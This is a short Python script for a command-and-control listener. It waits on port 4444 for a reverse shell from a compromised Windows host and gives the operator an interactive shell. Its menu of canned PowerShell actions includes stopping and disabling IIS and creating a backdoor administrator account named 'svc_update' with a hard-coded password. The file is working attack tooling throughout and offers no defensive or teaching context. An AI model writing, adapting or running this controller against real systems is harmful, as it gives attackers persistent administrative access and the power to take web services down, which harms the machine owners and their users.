import socket
import time

HOST = "0.0.0.0"
PORT = 4444

def send_command(conn, command):
    conn.send((command + "\n").encode("utf-8"))
    time.sleep(1)
    response = b""
    conn.settimeout(3)
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    return response.decode("utf-8", errors="ignore")

def interactive_mode(conn):
    print("[*] Dropping into interactive mode. Type 'back' to return to menu.\n")
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "back":
            break
        if cmd:
            print(send_command(conn, cmd))

def automation_menu(conn):
    automations = {
        "1": ("Disable IIS",        "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
        "2": ("Create admin user",  'New-LocalUser -Name "svc_update" -Password (ConvertTo-SecureString "P@ssw0rd99!" -AsPlainText -Force); Add-LocalGroupMember -Group "Administrators" -Member "svc_update"'),
        "3": ("Whoami + hostname",  "whoami; hostname"),
        "4": ("List local admins",  "Get-LocalGroupMember -Group Administrators"),
        "5": ("Check IIS status",   "Get-Service -Name W3SVC | Select-Object Status"),
    }

    while True:
        print("\n--- Automation Menu ---")
        for key, (label, _) in automations.items():
            print(f"  [{key}] {label}")
        print("  [0] Back")
        choice = input("Select> ").strip()
        if choice == "0":
            break
        if choice in automations:
            label, cmd = automations[choice]
            print(f"\n[*] Running: {label}")
            print(send_command(conn, cmd))

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Listening on port {PORT}...")

    conn, addr = server.accept()
    print(f"[+] Connection from {addr[0]}")

    while True:
        print("\n=== C2 Menu ===")
        print("  [1] Interactive shell")
        print("  [2] Automations")
        print("  [3] Exit")
        choice = input("Select> ").strip()

        if choice == "1":
            interactive_mode(conn)
        elif choice == "2":
            automation_menu(conn)
        elif choice == "3":
            conn.close()
            break

if __name__ == "__main__":
    main()